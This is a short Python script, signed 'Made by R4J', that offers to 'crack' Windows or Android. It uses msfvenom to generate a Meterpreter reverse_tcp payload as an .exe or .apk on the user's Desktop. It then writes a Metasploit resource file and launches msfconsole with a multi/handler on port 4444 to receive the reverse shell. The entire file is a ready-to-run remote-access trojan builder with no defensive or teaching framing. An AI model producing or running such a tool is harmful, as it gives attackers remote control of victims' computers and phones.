#!/usr/bin/python
from os import system
print """
[+] Made by R4J

1.Crack windows
2.Crack android
"""
a = raw_input("==> ")

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
s.close()

if a == "1":
  command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f exe > $HOME/Desktop/file.exe" % (ip)
  system(command)
  print "Payload added on your Desktop as file.exe"
  system("sleep 2")
  l = "set LHOST %s \n" % (ip)
  file = open("testfile.txt","w")
  file.write("use exploit/multi/handler \n")
  file.write(l)
  file.write("set LPORT 4444 \n")
  file.write("set PAYLOAD windows/meterpreter/reverse_tcp \n")
  file.write("run")
  file.close()
  system("msfconsole -r testfile.txt")

elif a == "2":
  command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=4444 > $HOME/Desktop/file.apk" % (ip)
  system(command)
  print "Payload added on your Desktop as file.apk"
  system("sleep 2")
  l = "set LHOST %s \n" % (ip)
  file = open("testfile.txt","w")
  file.write("use exploit/multi/handler \n")
  file.write(l)
  file.write("set LPORT 4444 \n")
  file.write("set PAYLOAD android/meterpreter/reverse_tcp \n")
  file.write("run")
  file.close()
  system("msfconsole -r testfile.txt")

else:
    exit()
